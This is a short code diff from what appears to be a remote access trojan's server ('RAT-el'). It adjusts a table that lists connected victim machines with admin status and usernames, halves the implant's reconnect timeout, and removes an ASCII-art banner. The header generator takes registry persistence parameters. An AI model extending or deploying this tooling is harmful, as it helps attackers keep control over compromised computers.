@@ -112,7 +112,7 @@ def printAllTarget():
         #print("TETS BOOL_>",type(Handler.dict_conn[key][NB_ALIVE]),":",Handler.dict_conn[key][NB_ALIVE])
         ptable.add_row([key,Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT],Handler.dict_conn[key][NB_ALIVE],Handler.dict_conn[key][NB_ADMIN],Handler.dict_conn[key][NB_PATH],Handler.dict_conn[key][NB_USERNAME]])
 
-        print(Fore.GREEN,(ptable),Fore.BLUE)
+    print(Fore.GREEN,(ptable),Fore.BLUE)
 
 def myBanner():
     return """
@@ -165,7 +165,7 @@ def commonHeader():
 #define BUFFER_LEN 4096
 #define BUFFER_EXEC 1024 //Buffer for exec
 #define TIMEOUT_SOCK 5 
-#define TIMEOUT_SOCK_RECONNECT 4000// timeout between each connection
+#define TIMEOUT_SOCK_RECONNECT 2000// timeout between each connection
 #define SLEEP_RECV 200 
 #define TIMEOUT_POPEN 5000 
 #define MICRO_SLEEP 100 //micro sleep for timeout
@@ -209,7 +209,7 @@ def customHeader(ip, auto, port, reco, name, registry, key):
 #define BUFFER_EXEC 1024 //Buffer for exec
 #define BUFFER_LEN 4096
 #define TIMEOUT_SOCK 5 
-#define TIMEOUT_SOCK_RECONNECT 4000// timeout between each connection
+#define TIMEOUT_SOCK_RECONNECT 2000// timeout between each connection
 #define SLEEP_RECV 200
 #define MICRO_SLEEP 100 //micro sleep for timeout
 #define SPLIT "|SPLIT|" 
@@ -220,48 +220,3 @@ def customHeader(ip, auto, port, reco, name, registry, key):
 """.format(ip, port, auto, reco, name, registry,key)
 
     return header
-
-
-'''
-def myBanner():
-    myvar = """
-                         .:--=======-:.                         
-                    .-+#%@@@@@@@@@@@@@@%#+=:                    
-                 :+#@%#*+=-::::::-=+*#%@@@@@%*-                 
-              .=#%*=:                  :=*%@@@@%+:              
-            .+%+:   .:-=+++****++==-:      :+%@@@@#-            
-          .+#-  .:=*************+==--:.       -#@@@@#:          
-         -*:  :+***********+=:.:---:.           :#@@@@+         
-        +-  -********=-:::.-++=:.                 -%@@@#.       
-      .=. -********- .-==*+-           .:=+**#%%%%%%@@@@%:      
-     .- .+********: +@@#-           .=#@@@@@@@@@@@@@@@@@@%:     
-     : :*********= =@%-           . :+#@@@@@@@@@@@@@@@@@@@%:    
-      -*********+.-%+          :*#*#@@@@@@@@@@@@@@@@@@@@@@@%.   
-     -*********+ =%-          +#=:: -@@@@@@@@@@@@@@@@@@@@@@@+   
-    .*********+ =%:          #%#@@@* %@@@@@@@%*+=-=++*##%@@@@.  
-    +*********.-%:          =@@@@@@@-@@@@@%+:.=*#%@@@@@@@@@@@+  
-   -*********=.%=      .-=+*%@@@@@@%%@@@@*.     .=#@@@@@@@@@@%  
-   +*********.*#     .*@@@@@@@@@@@@@@@@@#+###-:=*##%@@@@@@@@@@. 
-  .*********:-@:     +%@%#@@@@@@@@@@@@@@@@%-:*@@@@@@@@@@@@@@@@- 
-  :********= %%    .+@@+  %@@@@@@@@@@@@@@+.+@@@@@@@@@@@@@@@@@@- 
-  -*******+ +@%==+#@@%-  :@@@@@@@@@@@@@@= *@@@@@@@@@@@@@@@@@@@- 
-  -******+ =@@@@@@@@%-.-*@@@@@@@@@@@@@@+ =@@@@@@@@@@@@@@@@@@@@: 
-  :*****+.-@@@@@@@@@%@@@@@@@@@@@@@@@@@%..+@@@@@@@@@@@@@@@@@@@%  
-  .****- =%**%@@@@@@@@@@@@@@@@@@@@@@@@+ .#@@@@@@@@@@@@@@@@@@@*  
-   ++: :#%#*+=#@@@@@@@@@@@@@@@@@@@@@@%..#@@@@@@@@@@@@@@@@@@@@-  
-   . :#+=====%@@@@@@@@@@@%*=:+@@@@@@%-=%@@@@@#*++*#@@@@@@@@@#   
-     %:=@@%%@@@@@@@@@@@%- :-.=@@@@@@#%@@@@@@#+: .. .*@@@@@@@:   
-     *+:+:=%@@@@@@@@@@*.-*#*#@@@@@@@@@@#*+-..-+****- *@@@@@=    
-      =%%@@@@@@@@@@@%++##=-+%@@@@%#+-:  .:-+*******+ .%@@@+     
-       .+%@@@@@@@@@%#%+:-+%@@@%*-  .:=+***********+.  #@@+      
-          -+#%@@@@@@%++#@@@@#= .:=***************+.  :%@=       
-         ::.  .-=-.+%@@%#*=. -+*****************-   =%%:              
-          :**+++++-.      :=******************=.  .*%+             
-            :+*******+=++*******************=.   =%*.               ____  ___  ______         __   _____    
-              :=*************************+-.  .=%+.                / __ \/   |/_  __/   ___  / /  / ___/___  ______   _____  _____
-                 :-+******************=-.   :+*-                  / /_/ / /| | / /_____/ _ \/ /   \__ \/ _ \/ ___/ | / / _ \/ ___/   
-                     .:-==++++++==-:.   .-==-                    / _, _/ ___ |/ /_____/  __/ /   ___/ /  __/ /   | |/ /  __/ / 
-                                    ...::                       /_/ |_/_/  |_/_/      \___/_/   /____/\___/_/    |___/\___/_/
-"""
-    return myvar
-'''
